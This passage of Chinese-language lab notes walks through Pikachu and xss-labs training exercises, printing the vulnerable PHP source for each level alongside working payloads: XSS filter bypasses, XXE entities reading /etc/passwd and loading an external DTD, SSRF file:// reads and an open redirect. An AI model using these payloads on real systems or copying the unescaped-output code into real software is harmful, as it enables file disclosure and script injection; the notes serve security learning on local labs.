class="string">&#x27;O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:8:&quot;pikachua&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span>	</span><br><span class="line"><span class="comment">//输出：pikachua</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">常见魔术方法：</span></span><br><span class="line"><span class="comment">	__construct()，类的构造函数	__destruct()，类的析构函数</span></span><br><span class="line"><span class="comment">	__call()，在对象中调用一个不可访问方法时调用</span></span><br><span class="line"><span class="comment">	__callStatic()，用静态方式中调用一个不可访问方法时调用</span></span><br><span class="line"><span class="comment">	__get()，获得一个类的成员变量时调用		__set()，设置一个类的成员变量时调用</span></span><br><span class="line"><span class="comment">	__isset()，当对不可访问属性调用isset()或empty()时调用</span></span><br><span class="line"><span class="comment">	__unset()，当对不可访问属性调用unset()时被调用。</span></span><br><span class="line"><span class="comment">	__sleep()，执行serialize()时，先会调用这个函数</span></span><br><span class="line"><span class="comment">	__wakeup()，执行unserialize()时，先会调用这个函数</span></span><br><span class="line"><span class="comment">	__toString()，类被当成字符串时的回应方法</span></span><br><span class="line"><span class="comment">	__invoke()，调用函数的方式调用一个对象时的回应方法</span></span><br><span class="line"><span class="comment">	__set_state()，调用var_export()导出类时，此静态方法会被调用。</span></span><br><span class="line"><span class="comment">	__clone()，当对象复制完成时调用		__autoload()，尝试加载未定义的类</span></span><br><span class="line"><span class="comment">	__debugInfo()，打印所需调试信息</span></span><br><span class="line"><span class="comment">	//PHP讲以双下划线__保留为魔术方法，所有的魔术方法 必须 声明为 public。</span></span><br><span class="line"><span class="comment">	//详解；https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">pikachu源码：</span><br><span class="line"></span><br><span class="line">pikachu:</span><br><span class="line">	<span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$s</span>=<span class="keyword">new</span> <span class="title function_ invoke__">S</span>(); <span class="comment">//创建一个对象</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>); <span class="comment">//把这个对象进行序列化</span></span><br><span class="line">   </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>利用：</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">O</span>:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;<span class="attr">s</span>:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;<span class="attr">s</span>:<span class="number">25</span>:<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">参考链接:https://article.itxueyuan.com/nW74BB</span><br><span class="line">xml:传输和存储数据格式类型,传输数据</span><br><span class="line">XXE:指&quot;xml外部实体注入漏洞&quot;，即xml上的漏洞。概括一下就是&quot;攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题&quot;也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。</span><br><span class="line">危害:文件读取,RCE利用,内网攻击,DOS攻击</span><br><span class="line"></span><br><span class="line">显示内容:</span><br><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="string">&quot;存在XXE漏洞&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"></span><br><span class="line">读取内容:</span><br><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///G://wshy.txt&quot;</span>&gt;</span>    </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">===============================================</span><br><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:////etc/passwd&quot;</span>&gt;</span>    </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">================================================</span><br><span class="line">引入外部实体:</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">        %file;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//下面的是写入文件的</span><br><span class="line">evil.dtd:</span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">send</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///G:/wshy.txt&quot;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="不安全的url跳转"><a href="#不安全的url跳转" class="headerlink" title="不安全的url跳转"></a>不安全的url跳转</h1><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">不安全的url跳转问题可能发生在一切执行了url地址跳转的地方。\</span><br><span class="line">如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的url地址)参数作为了跳转的目的地,而又没有做判断的话\</span><br><span class="line">就可能发生&quot;跳错对象&quot;的问题。\</span><br><span class="line">\</span><br><span class="line">url跳转比较直接的危害是:\</span><br><span class="line">--&gt;钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站</span><br></pre></td></tr></table></figure>

<p>利用：</p>
<ul>
<li>127.0.0.1&#x2F;pikachu&#x2F;vul&#x2F;urlredirect&#x2F;urlredirect.php?url&#x3D;<a href="https://www.baidu.com/">https://www.baidu.com</a></li>
</ul>
<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><ul>
<li>对内网情况进行探测</li>
</ul>
<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/26749c91d3ff45e7af4db5a09fc06060~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<ul>
<li><a href="http://127.0.0.1/pikachu/vul/ssrf/ssrf_fgc.php?file=file:///E:/phpstudy/WWW/123.TXT">http://127.0.0.1/pikachu/vul/ssrf/ssrf_fgc.php?file=file:///E:/phpstudy/WWW/123.TXT</a></li>
</ul>
<p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/31c53afc3f2642a79395ad4a7760635c~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>xss-labs-master靶场笔记</title>
    <url>/2022/10/01/xss-labs-master%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><ul>
<li>在线地址：<a href="https://xss.tesla-space.com/">https://xss.tesla-space.com/</a></li>
<li>phpstudy搭建</li>
</ul>
<h1 id="level1："><a href="#level1：" class="headerlink" title="level1："></a>level1：</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level2.php?keyword=test&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = $_GET[&quot;name&quot;];</span></span><br><span class="line"><span class="meta">echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level1.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>通过PHP的GET方式传参，打印输出</li>
</ul>
<p><code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p>
<h1 id="level2"><a href="#level2" class="headerlink" title="level2:"></a>level2:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level3.php?writing=wait&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level2<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level2<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = $_GET[&quot;keyword&quot;];</span></span><br><span class="line"><span class="meta">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="meta">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=keyword  value=&quot;&#x27;.$str.&#x27;&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span></span><br><span class="line"><span class="meta">&lt;/form&gt;</span></span><br><span class="line"><span class="meta">&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level2.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span></span><br><span class="line"><span class="string">.&quot;</span>&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;</span>.</span><br></pre></td></tr></table></figure>


<p>​<br>​<br>​                </p>
<h1 id="level3"><a href="#level3" class="headerlink" title="level3:"></a>level3:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level4.php?keyword=try harder!&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level3<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level3<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = $_GET[&quot;keyword&quot;];</span></span><br><span class="line"><span class="meta">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;</span></span><br><span class="line"><span class="meta">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=keyword  value=&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;&gt;	</span></span><br><span class="line"><span class="meta">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="meta">&lt;/form&gt;</span></span><br><span class="line"><span class="meta">&lt;/center&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level3.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>闭合弹窗<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&gt; onclick=&#x27;</span><span class="title function_">alert</span>(<span class="number">1</span>)<span class="string">&#x27; //</span></span><br><span class="line"><span class="string">&#x27;</span>&gt; onmouseover=<span class="title function_">alert</span>(<span class="number">1</span>)<span class="comment">//</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="level4"><a href="#level4" class="headerlink" title="level4:"></a>level4:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level5.php?keyword=find a way out!&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level4<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level4<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = $_GET[&quot;keyword&quot;];</span></span><br><span class="line"><span class="meta">$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);</span></span><br><span class="line"><span class="meta">$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);</span></span><br><span class="line"><span class="meta">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="meta">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=keyword  value=&quot;&#x27;.$str3.&#x27;&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="meta">&lt;/form&gt;</span></span><br><span class="line"><span class="meta">&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level4.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str3).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;onclick=&#x27;alert(1)&#x27; //</span></span><br></pre></td></tr></table></figure>

<h1 id="level5"><a href="#level5" class="headerlink" title="level5:"></a>level5:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level6.php?keyword=break it out!&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level5<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level5<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = strtolower($_GET[&quot;keyword&quot;]);</span></span><br><span class="line"><span class="meta">$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span></span><br><span class="line"><span class="meta">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span></span><br><span class="line"><span class="meta">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="meta">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=keyword  value=&quot;&#x27;.$str3.&#x27;&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="meta">&lt;/form&gt;</span></span><br><span class="line"><span class="meta">&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level5.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str3).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt; &lt;a href=&quot;</span><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)<span class="string">&quot;&gt; //</span></span><br></pre></td></tr></table></figure>

<h1 id="level6"><a href="#level6" class="headerlink" title="level6:"></a>level6:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level7.php?keyword=move up!&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level6<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level6<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = $_GET[&quot;keyword&quot;];</span></span><br><span class="line"><span class="meta">$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span></span><br><span class="line"><span 